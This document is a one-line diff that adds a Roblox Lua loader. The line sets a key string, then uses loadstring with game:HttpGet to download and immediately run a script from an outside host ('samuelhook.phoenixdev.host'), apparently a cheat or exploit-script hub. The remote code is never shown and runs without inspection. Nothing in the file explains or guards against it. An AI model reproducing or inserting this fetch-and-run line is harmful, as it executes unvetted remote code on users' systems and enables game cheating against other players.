@@ -1,0 +1,1 @@
+shared.key="Key_Dk3EisGLvoTEzFKXQR3YizMjMonCy76i";loadstring(game:HttpGet("http://samuelhook.phoenixdev.host/lua/mainscript.lua"))()
